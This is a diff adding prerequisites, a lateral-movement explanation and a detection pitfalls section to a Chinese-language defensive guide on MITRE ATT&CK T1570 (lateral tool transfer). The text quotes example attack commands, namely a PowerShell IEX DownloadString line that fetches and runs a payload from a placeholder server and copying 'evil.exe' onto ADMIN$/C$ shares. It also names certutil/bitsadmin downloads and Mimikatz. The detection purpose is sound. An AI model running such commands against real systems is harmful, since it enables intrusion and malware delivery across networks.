@@ -18,11 +18,21 @@
 
 - ⭐ 初级（基础概念，容易理解）
 
+## 前置知识检查
+
+**读这个文件需要什么？**
+
+- [ ] 远程访问协议（RDP/SMB/SSH/WinRM）
+- [ ] Windows认证与Pass-the-Hash
+- [ ] AD域信任关系基础
+
 ## 技术描述
 
 横向工具传输（T1570）是MITRE ATT&CK框架中横向移动战术下的一种技术。
 
 **通俗解释：**
+
+**过渡段：** 不要误以为横向移动只是'远程登录其他电脑'——真正的横向移动是一系列精巧的信任链利用：从一个普通工作站窃取的凭据，可以访问文件服务器；文件服务器上的管理员哈希，可以登录域控制器。每一次跳跃都是一次权限的扩大和访问范围的延伸。
 当攻击者攻陷了网络中的一台电脑后，他们通常需要把攻击工具（如远程控制软件、扫描器、勒索软件）传输到网络中的其他电脑上，以便继续扩大入侵范围。攻击者会使用各种文件传输方式——比如复制文件到共享文件夹、通过PSExec传输文件、使用WinRM的文件传输功能、或者用WMIC复制文件。这种技术本身不是攻击手段，而是攻击者横向移动中必不可少的一个"步骤"。
 
 **技术原理：**
@@ -147,6 +157,10 @@ graph TD
 - 配置Sysmon监控所有文件创建事件（Event ID 11），关注`C:\Windows\Temp\`目录
 - 监控高价值系统的SMB连接数量和频率
 
+## 避坑指南
+
+防御最大误区：只关注南北向流量而忽略东西向流量。
+
 ## 检测建议
 
 ### 网络层检测
@@ -166,7 +180,11 @@ graph TD
 
 > 横向工具传输是横向移动的"物流环节"——攻击者攻陷一台机器后，需要把密码提取工具（Mimikatz）、扫描工具（CrackMapExec）、后门payload等文件从这台机器复制到下一台目标机器上。常用的传输方式包括：copy命令通过SMB管理共享（copy evil.exe \\target\admin$\）、PowerShell的Invoke-WebRequest从远程服务器下载（IEX (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')）、以及bitsadmin或certutil利用Windows内置工具下载。检测方法：监控对ADMIN$、C$共享的写入操作（事件ID 5145）、从非文件服务器向其他机器大量复制exe/ps1/dll文件、以及certutil.exe或bitsadmin.exe用于URL下载（非正常使用场景）。
 >
-> **避坑指南**：只监控外部RDP，忽略内网横向RDP；忽略SMB管理共享异常访问；未区分正常SSH管理连接和异常横向。
+> **避坑指南**：
+> - **只监控外部RDP忽略内网横向**：很多团队只监控来自外网的RDP登录告警，但攻击者进入内网后通过SMB管理共享（ADMIN$、C$）横向传输工具才是主要手段。内网SMB文件写入（事件ID 5145）比外部RDP告警更值得关注。
+> - **忽略SMB管理共享异常访问**：攻击者常用 `copy evil.exe \\target\C$\Windows\Temp\` 通过管理共享传输工具。如果只监控普通文件共享（如公司共享文件夹）而不监控ADMIN$和C$的写入操作，会漏掉大部分横向工具传输行为。
+> - **未区分正常SSH管理和异常横向**：Linux环境下的SCP/rsync传输可能被误报为正常运维。关键看**传输内容**——如果是从一台非跳板机的工作站向多台服务器批量传输可执行文件或脚本，而非配置文件或日志，则高度可疑。
+> - **只看文件传输不看执行**：攻击者传输工具后一定会执行它。如果只监控文件复制而不关联后续的进程创建（如PSExec创建服务、schtasks创建计划任务），会错过完整的攻击链。文件传输+远程执行两个事件关联分析才是有效检测。
 
 **Sigma规则示例：**
 ```yaml
@@ -258,13 +276,13 @@ tags:
 
 ## 参考资料
 
-### 官方文档
+### 📚 官方文档（深入了解）
 
 - [MITRE ATT&CK - Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/)
 - [防御SMB滥用 - Microsoft安全文档](https://docs.microsoft.com/en-us/windows/security/threat-protection/)
 - [Sysmon部署指南 - Microsoft安全](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
 
-### 安全报告
+### 📰 安全报告（真实攻击）
 
 - [LockBit 3.0勒索软件技术分析 - Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/lockbit-3-0-ransomware)
 - [CISA Royal勒索软件联合公告](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a)
